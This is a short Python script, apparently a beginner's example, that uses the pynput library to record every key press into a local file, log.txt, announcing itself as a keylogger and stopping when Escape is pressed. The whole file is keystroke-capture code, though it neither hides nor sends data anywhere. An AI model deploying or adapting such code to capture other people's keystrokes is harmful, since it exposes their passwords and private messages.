from pynput.keyboard import Listener

def key_saver(key):
    if(str(key) == 'Key.esc'):
        return False
    with open("log.txt", "a") as file:
        file.write(str(key) + "\n")
    
    
with Listener(on_press=key_saver) as listener:
    print("[+] Keylogger is running... (press ESC to stop)")
    listener.join()

print("Program stopped successfully")